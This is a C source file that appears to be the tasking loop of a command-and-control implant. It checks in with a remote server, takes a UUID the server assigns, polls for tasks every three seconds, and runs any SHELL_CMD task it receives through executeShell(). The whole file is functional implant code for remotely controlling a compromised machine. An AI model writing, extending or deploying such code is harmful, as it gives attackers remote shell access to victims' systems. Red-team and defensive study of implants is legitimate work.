#include "ceos.h"
#include "Command.h"


BOOL handleGetTasking(PParser getTasking)
{
	UINT32 numTasks = getInt32(getTasking);
	if (numTasks)
		printf("[TASKING] Got %d tasks !\n", numTasks);

	for (UINT32 i = 0; i < numTasks; i++)
	{
		SIZE_T sizeTask = getInt32(getTasking) - 1;
		BYTE task = getByte(getTasking);
		PBYTE taskBuffer = getBytes(getTasking, &sizeTask);
		PParser taskParser = newParser(taskBuffer, sizeTask);

		if (task == SHELL_CMD)
		{
			executeShell(taskParser);
		}
	}

	return TRUE;
}


BOOL commandDispatch(PParser response)
{
	BYTE typeResponse = getByte(response);
	if (typeResponse == GET_TASKING)
		return handleGetTasking(response);
	else if (typeResponse == POST_RESPONSE)
		return TRUE;

	return TRUE;
}


BOOL parseCheckin(PParser ResponseParser) {
	if (getByte(ResponseParser) != CHECKIN)
	{
		freeParser(ResponseParser);
		return FALSE;
	}

	SIZE_T sizeUuid = 36;
	PCHAR newUUID = getString(ResponseParser, &sizeUuid);
	setUUID(newUUID);

	printf("[TASKING] Got new UUID ! --> %s\n", newUUID);

	freeParser(ResponseParser);

	return TRUE;
}


BOOL routine()
{
	PPackage getTask = newPackage(GET_TASKING, TRUE);
	addInt32(getTask, 1);
	Parser* ResponseParser = sendPackage(getTask);

	if (!ResponseParser)
		return FALSE;

	commandDispatch(ResponseParser);

	Sleep(3000);

	return TRUE;

}